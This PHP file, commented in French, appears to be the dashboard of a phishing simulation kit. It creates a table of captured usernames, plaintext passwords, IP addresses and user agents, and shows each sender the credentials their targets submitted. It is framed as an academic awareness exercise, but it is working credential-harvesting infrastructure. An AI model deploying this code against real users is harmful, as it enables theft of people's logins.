<?php
// fake_login/dashboard.php
// Interface d'audit et de journalisation des accès (Version Sécurisée)

session_start();
require_once '../traitements/db.php';

// 1. Contrôle d'accès : Seul un utilisateur authentifié peut consulter les journaux
if (!isset($_SESSION["user_id"])) {
    header("Location: ../login.php");
    exit();
}

$user_id = $_SESSION["user_id"];

// 2. Initialisation sécurisée de la structure de stockage si inexistante
// Remarque : Dans une application de production, les mots de passe ne doivent jamais être stockés en clair.
$create_table_sql = "CREATE TABLE IF NOT EXISTS phishing_captures (
    id INT AUTO_INCREMENT PRIMARY KEY,
    sender_id INT NOT NULL,
    captured_username VARCHAR(255) NOT NULL,
    captured_password VARCHAR(255) NOT NULL,
    captured_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    ip_address VARCHAR(45),
    user_agent TEXT,
    FOREIGN KEY (sender_id) REFERENCES users(id) ON DELETE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;";

if (!$conn->query($create_table_sql)) {
    die("Erreur lors de la vérification des tables de journalisation.");
}

// 3. Récupération des logs liés à l'utilisateur courant (Requête Préparée)
$sql = "SELECT id, captured_username, captured_password, captured_at, ip_address, user_agent 
        FROM phishing_captures 
        WHERE sender_id = ? 
        ORDER BY captured_at DESC";

$stmt = $conn->prepare($sql);
$stmt->bind_param("i", $user_id);
$stmt->execute();
$result = $stmt->get_result();

$captures = [];
while ($row = $result->fetch_assoc()) {
    $captures[] = $row;
}
$stmt->close();
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tableau de Bord d'Audit - Sécurité</title>
    <style>
        :root {
            --primary-color: #2c3e50;
            --accent-color: #e74c3c;
            --bg-color: #f8f9fa;
            --card-bg: #ffffff;
            --text-color: #333333;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: var(--bg-color);
            color: var(--text-color);
            margin: 0;
            padding: 20px;
        }

        .container {
            max-width: 1100px;
            margin: 40px auto;
            background: var(--card-bg);
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
        }

        h1 {
            color: var(--primary-color);
            border-bottom: 2px solid #eee;
            padding-bottom: 10px;
            font-size: 1.8rem;
        }

        .alert-info {
            background-color: #e8f4fd;
            border-left: 4px solid #3498db;
            color: #2c3e50;
            padding: 15px;
            margin-bottom: 20px;
            border-radius: 4px;
            font-size: 0.9rem;
        }

        .table-responsive {
            width: 100%;
            overflow-x: auto;
            margin-top: 20px;
        }

        table {
            width: 100%;
            border-collapse: collapse;
            text-align: left;
        }

        th, td {
            padding: 12px 15px;
            border-bottom: 1px solid #e0e0e0;
            font-size: 0.9rem;
        }

        th {
            background-color: #f1f3f5;
            color: var(--primary-color);
            font-weight: 600;
        }

        tr:hover {
            background-color: #f8f9fa;
        }

        code {
            background: #f1f3f5;
            padding: 3px 6px;
            border-radius: 4px;
            font-family: "Courier New", Courier, monospace;
            color: var(--accent-color);
            font-size: 0.9rem;
        }

        .empty-state {
            text-align: center;
            padding: 40px 20px;
            color: #7f8c8d;
        }

        .nav-links {
            margin-top: 30px;
            display: flex;
            gap: 15px;
        }

        .btn {
            display: inline-block;
            text-decoration: none;
            padding: 10px 20px;
            background-color: var(--primary-color);
            color: white;
            border-radius: 4px;
            font-size: 0.9rem;
            transition: background 0.2s;
        }

        .btn:hover {
            background-color: #1a252f;
        }

        .btn-secondary {
            background-color: #7f8c8d;
        }

        .btn-secondary:hover {
            background-color: #616a6b;
        }
    </style>
</head>
<body>

    <div class="container">
        <h1>📊 Rapport d'Audit : Tentatives d'accès interceptées</h1>
        
        <div class="alert-info">
            <strong>Environnement académique :</strong> Ce tableau de bord recense les données soumises via les simulations d'ingénierie sociale à des fins d'analyse des risques et de sensibilisation.
        </div>

        <?php if (!empty($captures)): ?>
            <div class="table-responsive">
                <table>
                    <thead>
                        <tr>
                            <th>ID</th>
                            <th>Identifiant Saisi</th>
                            <th>Mot de passe (Simulé)</th>
                            <th>Date / Heure</th>
                            <th>Adresse IP</th>
                            <th>Navigateur (User-Agent)</th>
                        </tr>
                    </thead>
                    <tbody>
                        <?php foreach ($captures as $capture): ?>
                            <tr>
                                <td><?= intval($capture['id']); ?></td>
                                <td><code><?= htmlspecialchars($capture['captured_username'], ENT_QUOTES, 'UTF-8'); ?></code></td>
                                <td><code><?= htmlspecialchars($capture['captured_password'], ENT_QUOTES, 'UTF-8'); ?></code></td>
                                <td><?= htmlspecialchars($capture['captured_at'], ENT_QUOTES, 'UTF-8'); ?></td>
                                <td><?= htmlspecialchars($capture['ip_address'], ENT_QUOTES, 'UTF-8'); ?></td>
                                <td style="max-width: 250px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis;" title="<?= htmlspecialchars($capture['user_agent'], ENT_QUOTES, 'UTF-8'); ?>">
                                    <?= htmlspecialchars($capture['user_agent'], ENT_QUOTES, 'UTF-8'); ?>
                                </td>
                            </tr>
                        <?php endforeach; ?>
                    </tbody>
                </table>
            </div>
        <?php else: ?>
            <div class="empty-state">
                <p style="font-size: 1.2rem; margin-bottom: 5px;">Aucune donnée enregistrée</p>
                <p style="font-size: 0.9rem; margin: 0;">Les simulations d'interceptions n'ont capturé aucune donnée pour le moment.</p>
            </div>
        <?php endif; ?>

        <div class="nav-links">
            <a href="../inbox.php" class="btn">Retour à la Messagerie</a>
            <a href="helper.php" class="btn btn-secondary">Générateur de Liens</a>
        </div>
    </div>

</body>
</html>
<?php
$conn->close();
?>